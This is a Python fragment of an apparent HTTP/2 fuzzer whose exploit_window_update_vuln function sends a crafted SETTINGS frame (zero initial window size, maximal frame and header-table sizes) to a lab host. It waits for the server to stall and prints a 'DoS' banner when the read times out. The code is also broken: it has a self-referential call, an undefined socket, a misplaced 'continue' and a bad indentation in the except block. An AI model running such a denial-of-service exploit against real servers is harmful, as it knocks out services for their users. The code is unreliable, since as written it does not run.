def open_socket(self, dst_ip):
	# ... some code
	s.settimeout(6)
	# ... some code


def fuzzing_run(self):
	# ... some code
	# traverse each state transition
	print('\nTransaction: ', t_key)
	if t_key[:4] == 'init':
		self.exploit_window_update_vuln(t_msg, self.exploit_window_update_vuln(dst_ip='192.168.56.109'))
		continue
	else:
		continue
	# ...some code


def exploit_window_update_vuln(self, t_msg, sockBuf):
	try:
		prefaceFrame, firstSETTINGS = self.initframe_setting()
		init_msg = h2.H2Seq()
	  
		own_set = h2.H2Frame() / h2.H2SettingsFrame()
		max_frm_sz = (1 << 24) - 1
		max_hdr_tbl_sz = (1 << 16) - 1
		own_set.settings = [
			h2.H2Setting(id=h2.H2Setting.SETTINGS_ENABLE_PUSH, value=0),
			h2.H2Setting(id=h2.H2Setting.SETTINGS_INITIAL_WINDOW_SIZE, value=0),
			h2.H2Setting(id=h2.H2Setting.SETTINGS_HEADER_TABLE_SIZE, value=max_hdr_tbl_sz),
			h2.H2Setting(id=h2.H2Setting.SETTINGS_MAX_FRAME_SIZE, value=max_frm_sz),
		]
	  
		init_msg.frames = [prefaceFrame, own_set]
		print("Sending Initial Messages")
		sockBuf.send(init_msg)
		print("Sending Test Message")
		sockBuf.send(t_msg)

		while True:
			received_packet = sockBuf.recv()
			print("\nReceived packet")
			print(received_packet.show())
	except Exception as e:
		print(e)
		if str(e) == 'The read operation timed out':
		print("DDDDDDDDDDDDDDDDDDDDDDooooooooooooooooooooooooooooooooooSSSSSSSSSSSSSSSSSSSSSSSSSSSSS")

